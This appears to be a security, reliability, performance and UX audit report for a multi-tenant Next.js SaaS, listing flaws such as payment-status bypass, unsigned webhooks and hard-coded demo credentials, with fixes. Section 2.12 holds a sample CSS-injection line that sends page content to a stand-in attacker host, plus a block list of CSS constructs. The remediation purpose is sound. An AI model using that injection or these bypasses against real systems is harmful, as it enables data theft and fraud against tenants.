# Danets AI Automation — Audit Report

**Date:** 2026-08-08
**Scope:** Security, Reliability, Performance, Product/UX
**Method:** Four parallel reviewers across the dimensions, source-code primary, ranked by severity.

The codebase is a Next.js 16 / React 19 / Prisma + MySQL multi-tenant SaaS — 137 route handlers, 115 components, 1,172-line Prisma schema, 9 migrations, **0 unit tests**. It is functionally complete but has several production-blocking issues and many that will compound as customer count grows.

---

## TL;DR — Fix these before next deploy

1. **Schema drift: `Session.csrfToken` is in the schema but no migration creates it.** Every authenticated state-changing request is broken in production. *(Reliability #1, Critical)*
2. **Client-supplied `status` activates paid subscription when gateway keys are missing.** *(Security #C1, Critical)*
3. **GDPR delete wipes the entire tenant on a literal string confirm, with no re-auth.** *(Security #C2, Critical)*
4. **WhatsApp webhook has no signature verification.** *(Security #C3, Critical)*
5. **No password reset / forgot-password flow exists.** *(Product #C1, Critical)*
6. **Demo credentials are hard-coded into the live login UI.** *(Product #C2, Critical)*
7. **30+ list endpoints lack `(businessId, createdAt)` compound indexes.** *(Perf #5, Reliability #17, High)*
8. **Multi-write flows (payments verify, chat save, quote edits, automation runs) lack transactions.** *(Reliability #3, #5, #6, #9, High)*
9. **Cron retention does not apply scheduled plan downgrades.** *(Reliability #4, High)*
10. **CMS cache: `unstable_cache` callbacks are recreated each call, `getCmsPageBySlug`/`getCmsPostBySlug` aren't cached at all.** *(Perf #13, #14, High)*

---

## Section 1 — Critical (must fix before next deploy)

### 1.1 Schema drift: `Session.csrfToken` column missing from DB
- **Files:** `prisma/schema.prisma:81`, last migration that touches `Session` is `20260806020000_session_refresh_rotation/migration.sql`
- **Failure:** `ensureCsrfForSession()` issues `db.session.update({ data: { csrfToken } })` against a column that doesn't exist. Prisma throws `P2022: The column Session.csrfToken does not exist`. Every first authenticated POST/PATCH/DELETE returns 401 with `CSRF_INVALID`.
- **Fix:** Migration adding column + unique index: `ALTER TABLE Session ADD COLUMN csrfToken VARCHAR(191) NULL; CREATE UNIQUE INDEX Session_csrfToken_key ON Session(csrfToken);`

### 1.2 Client-supplied payment status activates paid subscription
- **File:** `src/app/api/payments/verify/route.ts:47`
- **Failure:** `let status = parsed.data.status ?? "success"`. If `PAYSTACK_SECRET_KEY` is missing, the assignment falls through and the success branch upgrades the subscription to `pro` for free.
- **Fix:** The gateway must be the only authority. If provider secret is unset, return `503`. Never read `status` from the request body.

### 1.3 GDPR delete is a single-click kill switch
- **File:** `src/app/api/gdpr/delete/route.ts:6-17`
- **Failure:** Only barrier is `requireSession()` + literal string `DELETE ALL MY DATA`. `db.business.delete` cascades through every `BusinessUser`, `Lead`, `ChatSession`, `Payment`, `Integration`. A single CSRF bypass or stolen session detonates the entire tenant.
- **Fix:** Require `currentPassword` re-entry (and TOTP if enabled). Soft-delete via `status="deleted"` + `deletedAt` with a 7-day purge queue. Write a snapshot to `BusinessSnapshot` first.

### 1.4 WhatsApp inbound webhook has no signature verification
- **File:** `src/app/api/whatsapp/incoming/route.ts` (POST handler)
- **Failure:** Anyone on the internet POSTs a fake inbound message to `/api/whatsapp/incoming`, the system runs the AI agent on attacker-controlled text, replies via WhatsApp Cloud API, and may fire automations under the customer's tenant.
- **Fix:** Use `req.text()` to preserve raw bytes, verify `X-Hub-Signature-256` against `META_APP_SECRET` with `crypto.createHmac` and `crypto.timingSafeEqual`.

### 1.5 No password reset / forgot-password flow
- **Files:** Missing entirely
- **Failure:** The product has `/login` and `/signup` but no recovery path. Anyone who forgets a password is stranded; support has to hand-reset in the database. Combined with `enforcePlatform2fa` (which makes losing TOTP + password = total lockout), this is a business-continuity risk.
- **Fix:** Add `/forgot-password` and `/reset-password` pages, `POST /api/auth/forgot-password` (signed token, email) and `POST /api/auth/reset-password` (consume token, invalidate other sessions). Mirror for platform admin.

### 1.6 Demo credentials hard-coded in login UI
- **Files:** `src/components/auth/auth-screen.tsx:55-62, 326-335`; `src/components/auth/platform-auth-screen.tsx:33-37, 172-175`
- **Failure:** `useState` defaults the email and password fields to `admin@danetstecpro.com / danets123`, and a "Demo account" block prints them in plain text. Server-rendered HTML contains the credentials before any JS runs.
- **Fix:** Remove default values. Gate the demo banner on `process.env.NODE_ENV !== "production"` AND `NEXT_PUBLIC_DEMO_MODE`.

### 1.7 Marketing pages 404 when CMS row is missing
- **Files:** `src/app/(marketing)/page.tsx:38-40`, `pricing/page.tsx:14-17`, `features/page.tsx:14-17`, `industries/page.tsx:14-17`, `about/page.tsx:14-17`
- **Failure:** Each calls `notFound()` if the CMS row is absent. A freshly-seeded DB or careless admin delete turns every visitor into a 404.
- **Fix:** Replace `notFound()` with a fallback hero + CTA. Also write `_prisma_migration_status` warnings to stderr so ops can see what's missing.

---

## Section 2 — High (fix in the next 1-2 sprints)

### 2.1 Multi-write flows lack transactions
- **Files:**
  - `src/app/api/payments/verify/route.ts:64-128` — payment + subscription + business updates outside a transaction
  - `src/app/api/public/chat/route.ts:130-225` — 3 chat-message writes per turn, no transaction
  - `src/app/api/quotes/[id]/items/route.ts:94-155` — POST + `recalculateTotals` race
  - `src/app/api/quotes/[id]/route.ts:101-167` — PATCH discount recompute race
  - `src/app/api/payments/initialize/route.ts:154-180` — free-plan branch
- **Fix:** Wrap any flow that touches 2+ rows in `db.$transaction`. For the chat save, group the two `chatMessage.create` calls and a fallback assistant message in one transaction with the AI call outside.

### 2.2 Webhook + cron paths are not idempotent
- **Files:** `src/app/api/payments/webhook/route.ts:62-72`, `src/app/api/cron/retention/route.ts:10-44`, `src/app/api/whatsapp/incoming/route.ts:59-114`
- **Failure:** Paystack/Flutterwave/Meta retries race and double-bill or duplicate records. Cron can fire twice and double-delete.
- **Fix:** Atomic "claim" pattern: `updateMany where status:"pending" data:{status:"success"}`. If `count === 0`, return `already_processed`. For Meta, dedupe by `providerRef` (`@@unique([businessId, providerRef])`).

### 2.3 Cron retention does not apply scheduled downgrades
- **File:** `src/lib/retention.ts:86-101`
- **Failure:** `BusinessSubscription.downgradeScheduledFor` is set by `applyPlanTransition` but never read. Customers keep paying the higher tier silently.
- **Fix:** Add a cron branch that scans `downgradeScheduledFor <= now()` and applies the plan downgrade within a transaction.

### 2.4 Missing compound indexes
- **Models:** `Lead`, `ChatSession`, `QuoteRequest`, `SupportTicket`, `AutomationRun`, `Payment`, `Invoice`, `ActivityLog`, `Notification`, `AiUsageLog`, `KnowledgeBaseItem`, `Document`, `WhatsAppMessage`
- **Failure:** Every list query is `WHERE businessId = ? ORDER BY createdAt DESC`. Without a compound index, the planner does a scan + filesort that costs 200-500ms on a 50k-row tenant.
- **Fix:** Add `@@index([businessId, createdAt])` (and `[businessId, updatedAt]` where relevant) to those models. Run via `migrate dev`.

### 2.5 CMS cache is broken
- **Files:** `src/lib/cms/index.ts:91, 115, 138, 185, 204, 269, 300` (helpers recreate the `unstable_cache` callback inside the function body — useless keyParts) and `:166-182, 241-267` (`getCmsPageBySlug` / `getCmsPostBySlug` are not cached at all)
- **Fix:** Hoist each `unstable_cache(...)` to module scope; wrap the two slug-based helpers in `unstable_cache(fn, [...], { tags: ["cms", "cms:pages"], revalidate: 60 })`.

### 2.6 No structured data (JSON-LD) on the marketing site
- **Impact:** No FAQ rich results, no product cards, no sitelinks search box. Lower CTR and signups vs. competitors.
- **Fix:** Add `Organization` + `WebSite` schema in the marketing layout. `FAQPage` in `FaqBlock`. `Article` / `BlogPosting` in `blog/[slug]`. `Product` / `Offer` in `PricingTableBlock`.

### 2.7 TOTP enable/disable has no rate limit; login rate limit is IP-only
- **Files:** `src/app/api/auth/totp/setup/route.ts`, `src/app/api/auth/login/route.ts:login`, `register`
- **Failure:** 6-digit TOTP brute-force possible at hundreds of attempts/sec if a session is stolen. Login/credential stuffing across a botnet bypasses per-IP rate limits.
- **Fix:** Compound key `rateLimit('login:${ip}:${email}', ...)` AND `rateLimit('login:${ip}', ...)`. Apply both. Add per-account lockout after 25 failed attempts in 15 min. For TOTP setup, per-user limit of 5 attempts per 10 min.

### 2.8 Tenant scoping uses `findUnique` + manual check in two endpoints
- **Files:** `src/app/api/conversations/[id]/route.ts:14-30`, `src/app/api/conversations/[id]/export/route.ts:21-37`
- **Failure:** Cross-tenant PII leak if a maintainer removes the `businessId !==` check. Pattern is fragile.
- **Fix:** Use `db.chatSession.findFirst({ where: { id, businessId: user.businessId } })` everywhere. Add a lint rule for the `findUnique` pattern in tenant-scoped routes.

### 2.9 Dashboard is a 700kB client component
- **Files:** `src/app/app/page.tsx`, views under `src/components/dashboard/views/*.tsx`
- **Failure:** All 17 view modules are eagerly imported in the client component. Initial TTI is 2-3s. Plus there's a useEffect+fetch auth bootstrap that already has the data on the server.
- **Fix:** Move auth bootstrapping to a server component (`AppShell` with user baked in). Use `next/dynamic` to lazy-load each view. Wrap the app in a `@tanstack/react-query` `QueryClientProvider` (already in deps but unused) and replace the 30+ hand-rolled `useEffect`+`fetch` patterns with `useQuery`/`useMutation`.

### 2.10 Marketing `[slug]` reserved list is hand-maintained
- **File:** `src/app/(marketing)/[slug]/page.tsx:14-30`
- **Failure:** A new marketing route (e.g. `/case-studies`) is silently shadowed by the dynamic page. No test catches new collisions.
- **Fix:** Move CMS pages to `/cms/[slug]` or generate the reserved list at build time from the directory.

### 2.11 `docs` page is a stub
- **File:** `src/app/(marketing)/docs/page.tsx:12-44`
- **Failure:** 11 hard-coded titles, every link points to `/docs` itself. No in-app help either.
- **Fix:** Either add real MDX pages under `/docs/[slug]` or remove the doc links from the nav until content exists.

### 2.12 White-label `customCss` accepts arbitrary CSS
- **File:** `src/app/api/white-label/route.ts` (PUT handler) + `prisma/schema.prisma:870`
- **Failure:** CSS injection via `background: url('https://attacker/?...')` exfiltrates page content to a remote host.
- **Fix:** Sanitize with a CSS allow-list (only `color`, `background-color`, `font-family`, `font-size`, `border-radius`, `margin`, `padding`). Block `url()`, `@import`, `expression`, `behavior`.

### 2.13 Super-admin tenants table is desktop-only and lacks bulk actions
- **File:** `src/components/dashboard/views/super-admin-view.tsx:933-959`
- **Fix:** Add mobile card view (mirror `leads-view.tsx:2512`). Add row checkboxes + bulk-action bar (suspend/activate/export-selected).

### 2.14 Payment reference has only 32 bits of entropy
- **File:** `src/app/api/payments/initialize/route.ts`
- **Fix:** Use `randomBytes(16)` for the reference. Drop the `Date.now()` providerRef fallback in `/api/payments/verify`.

### 2.15 Marketing pages phone-friendly, super-admin is not
- **Files:** All `src/components/dashboard/views/*-view.tsx`
- **Fix:** Mirror the `leads-view.tsx` mobile card pattern across all 6 large tables (quotes, tickets, leads, conversations, super-admin tenants, super-admin users).

---

## Section 3 — Medium (fix as capacity allows)

### 3.1 Auth / session
- **Auth on auth pages does no fresh credential step for high-blast-radius actions.** `requireSession()` alone gates GDPR delete, payment verify, super-admin password reset, white-label binding, plan downgrade. Same actor-action pairings should require a fresh TOTP or password re-entry.
- **Public widget config is cached 5 min on the CDN.** `Cache-Control: public, max-age=300` leaks customer bot configs to intermediary caches. Use `private, max-age=60`.
- **`getSession` returns user even when session is idle past `IDLE_TIMEOUT_MINUTES`.** Only `requireSession` throws. `/api/auth/me` reports the user as logged in. (`src/lib/auth.ts:228-267`)
- **Cron `Bearer` secret is non-constant-time compared.** `src/app/api/cron/retention/route.ts:20`. Use `crypto.timingSafeEqual`. Also reject startup if `CRON_SECRET.length < 32`.
- **Multiple auth surfaces have no rate limit or weak limits.** TOTP setup, widget config, contact form.

### 3.2 Schema / data model
- **Missing FK constraints on `Lead.assignedTo`, `LeadTask.assigneeId`, `LeadNote.authorId`, `LeadActivity.actorId`, `SupportTicket.assignedTo`, `ActivityLog.userId`.** Deleting a `BusinessUser` leaves dangling references. Add `@@unique` or `onDelete: SetNull` migrations.
- **`Lead.sessionId` is `@unique` but `Lead(businessId, email)` is not.** Two-tab same-email submissions create two leads. Add a unique constraint where email is not null.
- **`KnowledgeBaseItem` lacks `@@index([businessId, status])`.** AI retrieval scan on every chat.
- **`public/contact` does not dedupe on (email, pageSlug) within a short window.** A scripted attacker fills the leads DB.

### 3.3 Data integrity / transactions
- **`automation.runCount` race + non-safe JSON.stringify.** `src/lib/automation.ts:86-104`. Wrap run-create + counter-increment in a transaction; use `safeStringify` for `triggerData`.
- **`session.rotate` deletes then creates; concurrent rotation produces a swallowed `P2025`.** `src/lib/auth.ts:124-148`. Switch to `update` (single statement), or catch `P2025` specifically.
- **Quota checks re-query 15 times per `requireQuota` call.** `src/lib/plan-quota.ts:106-213`. Memoize per request via `AsyncLocalStorage`.

### 3.4 Performance / DX
- **24 list endpoints use `take: 200` with no `select`/`skip`/`cursor`.** `super-admin/businesses/export/route.ts:18` has no `take` at all (returns every business). Add cursor pagination + streaming CSV export.
- **`dashboard/stats` and `analytics` both call `computeDashboardInsights`; overview calls both → 2x work.** `src/lib/dashboard-insights.ts`. Wrap in `unstable_cache(...60s)`.
- **Lead and AiUsageLog queries in `computeDashboardInsights` have no `take` cap.** Use `groupBy` instead of `findMany` for count-by-bucket.
- **`/api/business` runs 4 sequential `count()` calls.** `src/app/api/business/route.ts:27-32`. Use `Promise.all`.
- **`ErrorBoundary` and many API routes use `console.error` / `catch (e: any)`.** Replace with the structured logger and `serializeError`.
- **11 stringly-typed error categories in `apiHandler` discriminated by `e?.message`.** Promote to typed error classes (`AppError` base) and switch on `instanceof`.
- **`@reactuses/core` and `react-hook-form` are deps but unused.** Wiring `useDebouncedCallback` and filtering forms through `Controller` removes a class of stale-closure bugs.
- **`unstable_cache` revalidate=60 is the only behavioural control — no comment explaining it.** Add a comment so future maintainers don't assume the 60s is the SLA.
- **`framer-motion` is used for a 0.3s spinner.** `src/app/app/page.tsx:155-165`. Replace with Tailwind animate-in/out. Saves ~80kB.
- **`@react-pdf/renderer` is ~600kB; quotes-view is 97kB and eagerly imported.** Use `next/dynamic` for the quotes view.

### 3.5 CSP / DOM
- **CSP allows `'unsafe-inline'` and `'unsafe-eval'` for scripts.** `next.config.ts:21`. Migrate to per-request nonce: middleware emits a base64 nonce, Next.js attaches it to every server `<Script>`. Drop `'unsafe-eval'`.
- **`BlockRenderer` has no per-block `ErrorBoundary`.** `src/components/marketing/block-renderer.tsx`. A bad hero block 500s the whole page.
- **`BlockRenderer` spreads `...props as any` per block.** `block-renderer.tsx:33-49`. Parse with the Zod schema from `cms/server.ts:77-99` per block type so editor typos cause a 4xx, not a silent empty UI.
- **No `prefers-reduced-motion` guard on Framer Motion.** Wrap with `<MotionConfig reducedMotion="user">` in the root layout.
- **No "skip to main content" link in either shell.** Add `sr-only` skip link + `id="main-content"` on `<main>`.
- **Notification bell auto-polls every 30s regardless of tab visibility.** `src/components/dashboard/shared/notification-bell.tsx:91`. Use the Page Visibility API.
- **Toast overload.** Many views toast for state that's already visible in the form. Reserve toasts for errors and async confirmations.

### 3.6 Product / UX
- **Demo credentials hard-coded (already listed as Critical §1.6).**
- **Marketing nav dropdown has no keyboard support.** `src/components/marketing/shell.tsx:125-146`. Use the existing `navigation-menu.tsx` Radix primitive.
- **Pricing "Start free" button doesn't differentiate logged-in vs new visitors.** All `ctaHref` go to `/signup`. Add `?plan={name}` deep-link.
- **Pricing table falls back to `null` if `plans.length === 0`.** Show a "Contact sales" panel instead.
- **Blog detail page has no Previous/Next navigation.** Compute `prev/next` from `listPublishedPosts`.
- **Changelog has no RSS feed.** Add `/changelog/rss.xml` and `<link rel="alternate">` in the marketing layout.
- **Mobile-unfriendly super-admin tables** (already listed as High §2.13).
- **Settings-view "Delete all my data" offers no cooling-off period.** Send a confirmation email with a one-time token.
- **Settings-view white-label preview shows no real widget preview.** Mount the actual widget in the preview frame using the configured colors.
- **Onboarding "embed viewed" step is misnamed.** `src/app/api/onboarding/route.ts:26,56` uses `aiUsageLog.count` as the embed-viewed check. Implement a real event.
- **Pricing card "Most popular" highlight is hard-coded to `plan.name === "pro"`.** Add a `featuredPlanName` prop.
- **Footer has no social icons.** Add `socialLinks` from `CmsSite.socialLinks`.
- **Subscribe-form focus & a11y polish.** Auth screen icons lack `aria-hidden`; submit button has 4 state-dependent labels without `aria-describedby`. (Product #H7.)
- **Search-bar `⌘K` hint shows on Windows.** `src/components/dashboard/app-shell.tsx:282-284`. Platform-aware.
- **Impersonation banner has no time limit and no audit trail in UI.** Add elapsed time + soft auto-exit at 15 min.
- **Empty `OverviewView` "Top Visitor Questions" empty state has no CTA.** Add "Test the widget" / "Configure AI agent" actions.
- **No blank-state for high-touch leads.** `take: 50` on notes/tasks/activities silently truncates older history. Add `?cursor=` endpoint.
- **No structured data (already listed as High §2.6).**

---

## Section 4 — Low (nice to have)

- LP card "Most popular" hard-coded to `"pro"` (perf duplicate).
- Pricing table hard-currency symbol, no currency code.
- Footer duplicates between marketing and dashboard.
- Cmd+K hint is `⌘K` on Windows.
- Marketing docs page link "Sign in →" points to `/login` not `/docs`.
- `dashboard/insights` 60s `unstable_cache` should be documented.
- `searchParams` parsing in many endpoints has no Zod — `status: "__proto__"` could pollute.
- `unstable_cache` revalidate=60 is the only SLA behaviour — undocumented.
- `next-intl` is in dependencies but unused — flag for i18n work.
- `@reactuses/core` is in deps but unused.
- `react-hook-form` is in deps but unused.
- `mammoth` is in deps for `.docx` parsing — verify no client-side import.
- `bcryptjs` is pure JS — slower than native `bcrypt`. Migrate when convenient.
- `pdf-parse` is in `serverExternalPackages` (good) but verify `mammoth` and `@napi-rs/canvas` are also properly handled.
- `next.config.ts` doesn't declare `optimizePackageImports: ["lucide-react", "@radix-ui/*"]` — add to reduce bundle.
- `ConversationDetail` and `conversations/[id]/export` both have no `take` cap on `messages`.
- L4 in security: `widget.js` allows `Access-Control-Allow-Origin: *` — intentional but worth SRI publication.

---

## Section 5 — Quick wins (≤ 1 day each, high impact)

| # | Fix | Effort | Impact |
|---|-----|--------|--------|
| 1 | Stop demo credentials in login UI (`AuthScreen` defaults) | 1h | Critical |
| 2 | Add `Session.csrfToken` migration | 30min | Critical |
| 3 | Wrap payment verify success path in `$transaction` | 2h | Critical |
| 4 | Add WhatsApp webhook HMAC verification | 2h | Critical |
| 5 | Fix `payments/verify` to never read `status` from the body | 1h | Critical |
| 6 | Add soft-delete pattern to GDPR delete | 3h | Critical |
| 7 | Add `@@index([businessId, createdAt])` to 12 models + migration | 3h | High |
| 8 | Wrap multi-write flows in `$transaction` (chat, quote-items, free-plan) | 4h | High |
| 9 | Add cron downgrade job | 2h | High |
| 10 | Hoist `unstable_cache` to module scope; wrap page/post slug helpers | 1h | High |
| 11 | Add `next/dynamic` for view imports in `src/app/app/page.tsx` | 2h | High |
| 12 | Add `Content-Type: application/ld+json` blocks (Organization, FAQ, Blog) | 3h | High |
| 13 | Add per-user TOTP rate limit + per-account login lockout | 3h | High |
| 14 | Replace `findUnique` + manual `businessId` check with `findFirst` | 2h | High |
| 15 | Fix inconsistent `unstable_cache` usage in `lib/cms/index.ts` | 1h | High |
| 16 | Add `next/dynamic` import for `quotes-view` and `@react-pdf/renderer` | 1h | Medium |
| 17 | Replace `console.error` in `ErrorBoundary` with structured logger | 30min | Medium |
| 18 | Add `MotionConfig reducedMotion="user"` in root layout | 30min | Medium |
| 19 | Add skip-to-content links in both shells | 30min | Medium |
| 20 | Add `Pre` + `Next` post navigation in `/blog/[slug]` | 1h | Medium |
| 21 | Add `super-admin-users` and `super-admin-tenants` mobile card views | 3h | Medium |
| 22 | Add `super-admin/tenants` bulk actions | 4h | Medium |
| 23 | Add `requireTotp` to GDPR delete, password reset, payment verify, white-label binding | 4h | High |
| 24 | Add /forgot-password + /reset-password + email-token flow | 1 day | Critical |
| 25 | Add docs content (or remove docs from nav) | 1 day | High |

---

## Section 6 — Themes

1. **Schema drift is the single biggest risk.** The schema declares `Session.csrfToken @unique` but no migration creates it; the `SubscriptionPlan` quota columns were declared but missing until a manual migration was added mid-audit. The drift is invisible to `prisma generate` but breaks production writes. **Recommendation:** add a CI step that runs `prisma migrate diff` against the staging DB and asserts empty output.

2. **Privileged actions don't require re-authentication.** GDPR delete, super-admin password reset, payment verify success path, white-label binding, plan downgrade — all rely on `requireSession()` alone. A single stolen session detonates the tenant. **Pattern:** fresh TOTP challenge within the last 5 minutes for any state-changing action that crosses a trust boundary.

3. **The product is shipped but documentation and customer-facing copy are placeholders.** `/docs` is a stub, `/widget-demo` is a confusing iframe-of-itself, the marketing nav references pages that exist but render empty CMS blocks. **Fix priority:** populate real docs before any new marketing spend.

4. **Tenant isolation relies on developer discipline.** The `findUnique` + manual `businessId !==` pattern works today but is fragile, and missing FK constraints on `assignedTo`/`authorId`/`actorId` leave dangling references after team-member deletes. **Pattern:** `findFirst({ where: { id, businessId } })` everywhere + FK constraints in a migration.

5. **The dashboard ships 700kB of JS for no reason.** All 17 view modules are eagerly imported as client components, and `useEffect`+`fetch` is hand-rolled everywhere despite `@tanstack/react-query` being a dependency. **Fix:** `next/dynamic` for views + `QueryClientProvider` for data. Payback is immediate at 10+ tenants.

6. **CSP is mature on the API side but loose on the page side.** `script-src` has `'unsafe-inline'` and `'unsafe-eval'`. Migrate to nonces — the lib/UI is already nonce-ready.

7. **Multi-write flows lack transactions.** Library code has `db.$transaction` in 12 files, but the operational paths (chat save, quote edit, automation run, session rotation) don't. **Rule:** if it touches 2+ rows, wrap it in `$transaction` and add a linter rule.

8. **There are 0 unit tests in the codebase.** `vitest` is in deps but `find src -name "*.test.ts"` returns 0. **First priority:** add tests for the auth flow, payment verify, and webhook signature verification (these are the three highest-value security boundaries).

---

## Section 7 — Recommendations by week

### Week 1 (Security/Correctness — Critical)
- Schema drift migration (Session.csrfToken)
- Stop demo credentials in login UI
- Wrap payment verify success in `$transaction`; never read `status` from request body
- WhatsApp webhook HMAC verification
- GDPR delete soft-delete + password re-auth
- Add /forgot-password + /reset-password flow

### Week 2 (Reliability — High)
- Multi-write transactions (chat, quote items, free-plan, automation run)
- Cron downgrade job
- Payment/Meta webhook idempotency
- Add `@@index([businessId, createdAt])` to 12 models
- Tenant-scoped `findFirst` everywhere
- Fix `unstable_cache` module-scope issue; wrap the two slug helpers

### Week 3 (Performance — High)
- `next/dynamic` for view imports
- `QueryClientProvider` + `useQuery` migration
- Cursor pagination on super-admin list endpoints
- Streaming CSV export
- Trae cache `getEffectiveLimits` / `getQuotaUsage` per request via `AsyncLocalStorage`

### Week 4 (Product/UX — High)
- Real `/docs` content (or remove from nav)
- Fix `/widget-demo` (it's an iframe of itself currently)
- JSON-LD on marketing pages
- Mobile card view for super-admin tables
- Bulk actions for super-admin tenants
- Add structured data + accessibility polish

### After launch (Medium/Low)
- CSP nonce migration
- Knowledge-base trust boundary (separate context from instructions)
- Soft-delete pattern for GDPR
- Password reset / TOTP recovery
- Real onboarding events
- Add tests (vitest harness is already in deps)
- Migrate `bcryptjs` → native `bcrypt`
- i18n via `next-intl`

---

## Appendix — Reviewer index

- **Security audit** — 3 critical + 6 high + 8 medium + 4 low. Detailed payload-format attacks and exploitation scenarios for each.
- **Reliability audit** — 3 critical + 7 high + 8 medium + 7 low. Concrete migration scripts and transaction rewrites for each.
- **Performance audit** — 7 high + 12 medium + 12 low. Migrated to `next/dynamic`, `react-query`, and `unstable_cache` patterns.
- **Product/UX audit** — 4 critical + 8 high + 25 medium + 15 low. Empty-state copy, a11y polish, mobile cards, structured data.
